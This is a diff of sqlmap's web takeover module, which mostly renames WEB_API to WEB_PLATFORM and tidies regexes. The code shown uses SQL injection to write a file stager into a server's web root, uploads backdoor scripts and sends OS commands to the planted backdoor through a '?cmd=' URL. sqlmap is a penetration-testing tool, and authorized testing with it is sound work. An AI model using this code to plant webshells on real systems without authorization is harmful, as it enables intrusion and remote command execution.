@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
 See the file 'LICENSE' for copying permission
 """
 
@@ -43,7 +43,7 @@ from lib.core.enums import HTTP_HEADER
 from lib.core.enums import OS
 from lib.core.enums import PAYLOAD
 from lib.core.enums import PLACE
-from lib.core.enums import WEB_API
+from lib.core.enums import WEB_PLATFORM
 from lib.core.exception import SqlmapNoneDataException
 from lib.core.settings import BACKDOOR_RUN_CMD_TIMEOUT
 from lib.core.settings import EVENTVALIDATION_REGEX
@@ -60,7 +60,7 @@ class Web:
     """
 
     def __init__(self):
-        self.webApi = None
+        self.webPlatform = None
         self.webBaseUrl = None
         self.webBackdoorUrl = None
         self.webBackdoorFilePath = None
@@ -77,7 +77,7 @@ class Web:
         if not cmd:
             cmd = conf.osCmd
 
-        cmdUrl = "%s?cmd=%s" % (self.webBackdoorUrl, cmd)
+        cmdUrl = "%s?cmd=%s" % (self.webBackdoorUrl, getUnicode(cmd))
         page, _, _ = Request.getPage(url=cmdUrl, direct=True, silent=True, timeout=BACKDOOR_RUN_CMD_TIMEOUT)
 
         if page is not None:
@@ -109,14 +109,14 @@ class Web:
         except TypeError:
             pass
 
-        if self.webApi in getPublicTypeMembers(WEB_API, True):
+        if self.webPlatform in getPublicTypeMembers(WEB_PLATFORM, True):
             multipartParams = {
                 "upload": "1",
                 "file": stream,
                 "uploadDir": directory,
             }
 
-            if self.webApi == WEB_API.ASPX:
+            if self.webPlatform == WEB_PLATFORM.ASPX:
                 multipartParams['__EVENTVALIDATION'] = kb.data.__EVENTVALIDATION
                 multipartParams['__VIEWSTATE'] = kb.data.__VIEWSTATE
 
@@ -130,7 +130,7 @@ class Web:
             else:
                 return True
         else:
-            logger.error("sqlmap hasn't got a web backdoor nor a web file stager for %s" % self.webApi)
+            logger.error("sqlmap hasn't got a web backdoor nor a web file stager for %s" % self.webPlatform)
             return False
 
     def _webFileInject(self, fileContent, fileName, directory):
@@ -146,8 +146,7 @@ class Web:
                 query += "OR %d=%d " % (randInt, randInt)
 
         query += getSQLSnippet(DBMS.MYSQL, "write_file_limit", OUTFILE=outFile, HEXSTRING=hexencode(uplQuery, conf.encoding))
-        query = agent.prefixQuery(query)
-        query = agent.suffixQuery(query)
+        query = agent.prefixQuery(query)        # Note: No need for suffix as 'write_file_limit' already ends with comment (required)
         payload = agent.payload(newValue=query)
         page = Request.queryPage(payload)
 
@@ -159,13 +158,13 @@ class Web:
         remote directory within the web server document root.
         """
 
-        if self.webBackdoorUrl is not None and self.webStagerUrl is not None and self.webApi is not None:
+        if self.webBackdoorUrl is not None and self.webStagerUrl is not None and self.webPlatform is not None:
             return
 
         self.checkDbmsOs()
 
         default = None
-        choices = list(getPublicTypeMembers(WEB_API, True))
+        choices = list(getPublicTypeMembers(WEB_PLATFORM, True))
 
         for ext in choices:
             if conf.url.endswith(ext):
@@ -173,7 +172,7 @@ class Web:
                 break
 
         if not default:
-            default = WEB_API.ASP if Backend.isOs(OS.WINDOWS) else WEB_API.PHP
+            default = WEB_PLATFORM.ASP if Backend.isOs(OS.WINDOWS) else WEB_PLATFORM.PHP
 
         message = "which web application language does the web server "
         message += "support?\n"
@@ -197,7 +196,7 @@ class Web:
                 logger.warn("invalid value, it must be between 1 and %d" % len(choices))
 
             else:
-                self.webApi = choices[int(choice) - 1]
+                self.webPlatform = choices[int(choice) - 1]
                 break
 
         if not kb.absFilePaths:
@@ -219,7 +218,7 @@ class Web:
                         finally:
                             been.add(url)
 
-                url = re.sub(r"(\.\w+)\Z", "~\g<1>", conf.url)
+                url = re.sub(r"(\.\w+)\Z", r"~\g<1>", conf.url)
                 if url not in been:
                     try:
                         page, _, _ = Request.getPage(url=url, raise404=False, silent=True)
@@ -231,7 +230,7 @@ class Web:
 
                 for place in (PLACE.GET, PLACE.POST):
                     if place in conf.parameters:
-                        value = re.sub(r"(\A|&)(\w+)=", "\g<2>[]=", conf.parameters[place])
+                        value = re.sub(r"(\A|&)(\w+)=", r"\g<2>[]=", conf.parameters[place])
                         if "[]" in value:
                             page, headers, _ = Request.queryPage(value=value, place=place, content=True, raise404=False, silent=True, noteResponseTime=False)
                             parseFilePaths(page)
@@ -243,12 +242,12 @@ class Web:
                     cookie = headers[HTTP_HEADER.SET_COOKIE]
 
                 if cookie:
-                    value = re.sub(r"(\A|;)(\w+)=[^;]*", "\g<2>=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", cookie)
+                    value = re.sub(r"(\A|;)(\w+)=[^;]*", r"\g<2>=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", cookie)
                     if value != cookie:
                         page, _, _ = Request.queryPage(value=value, place=PLACE.COOKIE, content=True, raise404=False, silent=True, noteResponseTime=False)
                         parseFilePaths(page)
 
-                    value = re.sub(r"(\A|;)(\w+)=[^;]*", "\g<2>=", cookie)
+                    value = re.sub(r"(\A|;)(\w+)=[^;]*", r"\g<2>=", cookie)
                     if value != cookie:
                         page, _, _ = Request.queryPage(value=value, place=PLACE.COOKIE, content=True, raise404=False, silent=True, noteResponseTime=False)
                         parseFilePaths(page)
@@ -267,16 +266,16 @@ class Web:
                     _.append("%s/%s" % (directory.rstrip('/'), path.strip('/')))
             directories = _
 
-        backdoorName = "tmpb%s.%s" % (randomStr(lowercase=True), self.webApi)
-        backdoorContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoors", "backdoor.%s_" % self.webApi))
+        backdoorName = "tmpb%s.%s" % (randomStr(lowercase=True), self.webPlatform)
+        backdoorContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoors", "backdoor.%s_" % self.webPlatform))
 
-        stagerContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stagers", "stager.%s_" % self.webApi))
+        stagerContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stagers", "stager.%s_" % self.webPlatform))
 
         for directory in directories:
             if not directory:
                 continue
 
-            stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webApi)
+            stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webPlatform)
             self.webStagerFilePath = posixpath.join(ntToPosixSlashes(directory), stagerName)
 
             uploaded = False
@@ -318,14 +317,14 @@ class Web:
                     infoMsg += "via UNION method"
                     logger.info(infoMsg)
 
-                    stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webApi)
+                    stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webPlatform)
                     self.webStagerFilePath = posixpath.join(ntToPosixSlashes(directory), stagerName)
 
                     handle, filename = tempfile.mkstemp()
                     os.close(handle)
 
                     with open(filename, "w+b") as f:
-                        _ = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stagers", "stager.%s_" % self.webApi))
+                        _ = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stagers", "stager.%s_" % self.webPlatform))
                         _ = _.replace(SHELL_WRITABLE_DIR_TAG, utf8encode(directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory))
                         f.write(_)
 
@@ -354,7 +353,7 @@ class Web:
                 logger.warn(warnMsg)
                 continue
 
-            elif self.webApi == WEB_API.ASPX:
+            elif self.webPlatform == WEB_PLATFORM.ASPX:
                 kb.data.__EVENTVALIDATION = extractRegexResult(EVENTVALIDATION_REGEX, uplPage)
                 kb.data.__VIEWSTATE = extractRegexResult(VIEWSTATE_REGEX, uplPage)
 
@@ -362,7 +361,7 @@ class Web:
             infoMsg += "on '%s' - %s" % (directory, self.webStagerUrl)
             logger.info(infoMsg)
 
-            if self.webApi == WEB_API.ASP:
+            if self.webPlatform == WEB_PLATFORM.ASP:
                 match = re.search(r'input type=hidden name=scriptsdir value="([^"]+)"', uplPage)
 
                 if match:
